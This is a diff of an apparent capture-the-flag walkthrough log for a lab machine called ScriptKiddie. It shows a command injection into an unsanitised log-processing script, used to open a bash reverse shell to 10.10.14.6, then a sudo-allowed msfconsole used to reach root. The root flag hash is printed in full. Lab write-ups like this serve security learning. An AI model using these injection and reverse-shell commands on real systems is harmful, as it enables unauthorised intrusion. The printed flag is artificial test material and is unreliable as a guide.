@@ -47,24 +47,62 @@ ls
 hackers
 kid@scriptkiddie:~/logs$ ls -al
 ls -al
-total 8
-drwxrwxrwx  2 kid kid 4096 Feb  3 07:40 .
-drwxr-xr-x 11 kid kid 4096 May 22 02:53 ..
--rw-rw-r--  1 kid pwn    0 Feb  3 11:46 hackers
-kid@scriptkiddie:~/logs$ cat hackers
-cat hackers
-kid@scriptkiddie:~/logs$ echo "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/1234 0>&1' " > hackers.sh
-<-i >& /dev/tcp/10.10.14.6/1234 0>&1' " > hackers.sh
-kid@scriptkiddie:~/logs$ cat hackers.sh
-cat hackers.sh
-/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/1234 0>&1' 
-kid@scriptkiddie:~/logs$ mv hackers.sh hackers
-kid@scriptkiddie:~/logs$ cat hackers
-cat hackers
-/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/1234 0>&1' 
-kid@scriptkiddie:~/logs$ ls -al
-ls -al
 total 12
 drwxrwxrwx  2 kid kid 4096 May 22 03:56 .
 drwxr-xr-x 11 kid kid 4096 May 22 02:53 ..
 -rwxrwxr-x  1 kid pwn   57 May 22 03:55 hackers
+=======================
+kid@scriptkiddie:~/logs$ cat /home/pwn/scanlosers.sh
+cat /home/pwn/scanlosers.sh
+#!/bin/bash
+
+log=/home/kid/logs/hackers
+
+cd /home/pwn/
+cat $log | cut -d' ' -f3- | sort -u | while read ip; do
+    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
+done
+
+if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
+=================
+Payload like : echo " HRI ; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/4242 0>&1' &" >> hackers
+pwn@scriptkiddie:~$ id
+id
+uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)
+pwn@scriptkiddie:~$ whoami
+whoami
+pwn
+pwn@scriptkiddie:~$ ls
+ls
+recon
+scanlosers.sh
+pwn@scriptkiddie:~$ pwd
+pwd
+/home/pwn
+pwn@scriptkiddie:~$ sudo -l
+sudo -l
+Matching Defaults entries for pwn on scriptkiddie:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User pwn may run the following commands on scriptkiddie:
+    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
+pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole
+sudo /opt/metasploit-framework-6.0.9/msfconsole
+                                                  
+msf6 > ls
+[*] exec: ls
+recon
+scanlosers.sh
+msf6 > cd /root
+msf6 > whoami
+[*] exec: whoami
+root
+stty: 'standard input': Inappropriate ioctl for device
+msf6 > ls
+[*] exec: ls
+root.txt
+msf6 > cat root.txt
+[*] exec: cat root.txt
+
+ee650aec2cdfbf78f70a32e39629cf0e
